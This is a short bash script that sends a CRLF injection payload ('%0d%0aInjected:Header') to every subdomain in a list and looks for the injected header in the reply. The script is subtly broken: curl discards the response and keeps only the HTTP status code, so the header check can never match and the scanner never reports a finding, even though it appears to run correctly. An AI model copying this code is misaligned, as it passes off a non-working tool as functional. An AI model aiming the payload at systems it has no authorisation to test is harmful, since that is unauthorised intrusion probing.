#!/bin/bash

echo "./find_crlf_injection.sh subdomains.txt"

# Check if curl is installed
if ! command -v curl &> /dev/null; then
    echo "Error: curl is not installed. Please install curl before running this script."
    exit 1
fi

# Check if input file is provided
if [ "$#" -ne 1 ]; then
    echo "Usage: $0 <subdomains_file>"
    exit 1
fi

# Input file containing subdomains
subdomains_file=$1

# Loop through each subdomain in the file
while IFS= read -r subdomain; do
    # Send a request to the subdomain with CRLF injection payload
    response=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: ${subdomain}" "http://${subdomain}/%0d%0aInjected:Header")

    # Check if the response contains the injected header
    if [[ "$response" == *"Injected:Header"* ]]; then
        echo "CRLF Injection found in subdomain: $subdomain"
    fi

done < "$subdomains_file"
